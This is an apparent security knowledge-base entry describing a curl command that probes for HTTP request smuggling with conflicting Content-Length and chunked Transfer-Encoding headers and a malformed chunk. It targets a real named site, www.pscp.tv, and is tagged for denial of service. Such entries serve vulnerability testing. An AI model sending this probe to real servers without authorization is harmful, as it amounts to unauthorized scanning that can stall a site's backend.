---
data: >-
  curl -i -s -k -X POST 'https://www.pscp.tv/' -H 'Content-Length: 0' -H
  'Transfer-Encoding: chunked' --data '0\r\nG'
tags:
  - http-smuggling
  - dos
type: command
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: 7887fbe1-6aa6-4b7d-8273-78e7d63a906e
created_at: '2025-12-13T09:01:21.908Z'
updated_at: '2025-12-13T09:01:21.908Z'
verified: false
validated: true
submitted: true
---
# Craft HTTP Smuggling Detection Request

## Command

```bash
curl -i -s -k -X POST 'https://www.pscp.tv/' -H 'Content-Length: 0' -H 'Transfer-Encoding: chunked' --data '0\r\nG'
```

## Description

This command sends a crafted POST request to detect HTTP Request Smuggling by triggering a delayed 504 response.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies POST method | Yes |
| `-H 'Content-Length: 0'` | Sets zero content length | Yes |
| `-H 'Transfer-Encoding: chunked'` | Enables chunked encoding | Yes |
| `--data '0\r\nG'` | Sends malformed chunk data | Yes |

## Examples

### Basic Usage

```bash
curl -i -s -k -X POST 'https://www.pscp.tv/' -H 'Content-Length: 0' -H 'Transfer-Encoding: chunked' --data '0\r\nG'
```

## Expected Output

A 504 Gateway Timeout after a 30-60 second delay, indicating vulnerability.

## Related

- [[procedures/Detect-HTTP-Request-Smuggling-Vulnerability-via-Delayed-Responses]]
